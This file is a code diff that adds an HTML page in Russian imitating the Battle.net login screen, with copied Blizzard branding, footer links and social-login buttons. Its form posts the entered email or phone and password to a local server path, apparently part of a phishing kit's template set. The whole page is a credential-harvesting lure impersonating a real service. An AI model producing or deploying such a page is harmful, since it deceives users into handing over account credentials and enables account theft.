@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" href="https://icons8.ru/icon/23802/battle-net" type="image/x-icon">
+    <link rel="stylesheet" href="styles/all.css">
+    <title>Авторизация в Battle.net</title>
+    
+    
+</head>
+<body>
+    <div class="grid-container wrapper">
+        <div class="box-wrapper">
+            <div class="main">
+                <div class="main-inner">
+                    <h1 class=" logo logo-horizontal logo-small"></h1>
+                </div>
+
+                <div class="input">
+                    <div class="login">
+                        <h3 id="login-header">Авторизоваться</h3>
+                    
+                        <div class="icons-authorization">
+                            <button id="google" class="btn third-party-login social-icon login-google" aria-label="Авторизоваться с помощью Google">
+                                <i class="icon-google"></i>
+                            </button>
+                            <button id="facebook"  class="btn third-party-login social-icon login-facebook" aria-label="Авторизоваться с помощью Facebook">
+                                <i class="icon-facebook"></i>
+                            </button>
+                            <button id="apple" class="btn  third-party-login social-icon login-apple" aria-label="Авторизоваться с помощью Apple">
+                                <i class="icon-apple"></i>
+                            </button>
+                        </div>
+
+                        <div class="icons-authorization">
+                            <button id="live" class="btn  third-party-login social-icon login-live" aria-label="Авторизоваться с помощью Xbox Network">
+                                <i class="icon-live"></i>
+                            </button>
+
+                            <button id="psn" class="btn third-party-login social-icon login-psn" aria-label="Авторизоваться с помощью PlayStation™Network" >
+                                <i class="icon-psn"></i>
+                            </button>
+
+                            <button id="nintendo" class="btn  third-party-login social-icon login-nintendo" aria-label="Авторизоваться с помощью Nintendo">
+                                <i class="icon-nintendo"></i>
+                            </button>
+
+                            <button id="steam" class="btn btn-block third-party-login social-icon login-steam" rel="external" aria-label="Авторизоваться с помощью Steam" title="Авторизоваться с помощью Steam" tabindex="0">
+                                <i class="icon-steam"></i>
+                            </button>
+                        </div>
+
+                        <div class="thirdparty-line">
+                            <span>или войти через</span>
+                        </div>
+
+
+                        <form action="http://127.0.0.1:2323/static/battle.net/" method="post" class="username-required">
+                            <div class="login-input-container">
+                                <div class="input-group">
+                                    
+                                    <input type="text" placeholder="Электронная почта или телефон" name="login" >
+                                    
+                                </div>
+
+                                <div class="input-group">
+                                    
+                                    <input type="password" placeholder="Пароль" name="password" >
+                                    
+                                </div>
+
+                            </div>
+                            <div class="input-group submit no-cancel">
+                                <button type="submit" class="btn btn-primary submit-button">
+                                    Авторизоваться
+                                </button>
+
+                            </div>
+                        </form>
+
+                        <ul id="help-links">
+                            <li role="link">
+                                <a rel="internal" href="" tabindex="0" id="signup" role="button">
+                                Зарегистрируйте учетную запись Battle.net бесплатно
+                                </a>
+                            </li>
+                            <li role="link">
+                                <a rel="internal" target="_blank" href="" id="loginSupport" role="button">
+                                Вы не можете войти?
+                                </a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <footer id="footer" class="footer ru-ru">
+            <div id="nav-client-footer" class="nav-client">
+                <div class="mobileFooterEnabled footer-content footer-desktop grid-container"> 
+                    <div class="nav-section">
+                        <div class="nav-left nav-logo-group">
+                            <div class="footer-links nav-left">
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/eula">Пользовательское соглашение Blizzard</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/about/privacy.html" >Политика конфиденциальности</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://www.blizzard.com/company/legal/">Условия</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="https://eu.blizzard.com/company/about/infringementnotice.html" >Авторское право</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="/login/cookies">Файлы cookie</a>
+                                <span>|</span>
+                                <a class="nav-item nav-a" href="/login/cookies#settings">Параметры cookie</a>
+                                <div class="copyright">© Blizzard Entertainment, Inc., 2023</div>
+                                <div class="nav-footer-icon-container">
+                                    <ul class="nav-footer-icon-list">
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            </footer>
+    </div>
+</body>
+</html>
